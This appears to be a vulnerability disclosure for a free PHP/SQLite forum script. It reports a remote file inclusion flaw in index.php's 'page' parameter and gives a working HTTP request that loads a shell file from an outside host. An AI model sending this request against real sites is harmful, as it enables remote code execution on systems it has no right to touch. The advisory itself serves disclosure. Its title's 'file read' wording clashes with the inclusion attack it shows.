# Simple Forum Website using PHP and SQLite3 Source Code Free Download - Arbitrary file read vulnerability
+ Author: xuanluansec
# Vendor Homepage
+ https://www.sourcecodester.com/php/16423/simple-forum-website-using-php-and-sqlite3-source-code-free-download.html
# Software Link
+ https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-sqlite-forum.zip
# Overview
+ xuanluansec has discovered a vulnerability classified as critical in Simple Forum Website using PHP and SQLite3 Source Code Free Download V1.0. Any file contains. This operation will result in unrestricted file inclusion, allowing remote execution of arbitrary code.
# Vulnerability Details
+ Simple Forum Website using PHP and SQLite3 Source Code Free Download V1.0
+ Vulnerable File: index.php
+ Parameter Names: page
+ Attack Type: Remote
# Description
+ xuanluansec has discovered a vulnerability classified as critical in Simple Forum Website using PHP and SQLite3 Source Code Free Download V1.0. Any file contains. This operation will result in unrestricted file inclusion, allowing remote execution of arbitrary code.
# Note
+ Need to register a user with arbitrary permissions.
![1](https://github.com/xuanluansec/vul/blob/main/vul/img/22.png)
# Proof of Concept (PoC) : 

```
GET /index.php?page=http://192.168.166.1:8888/shell HTTP/1.1
Host: www.php-sqlite-forum.com:8095
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=drgqvt3vblngekc6rqgraeor32
Upgrade-Insecure-Requests: 1


```

![2](https://github.com/xuanluansec/vul/blob/main/vul/img/21.png)

remote server

![3](https://github.com/xuanluansec/vul/blob/main/vul/img/23.png)
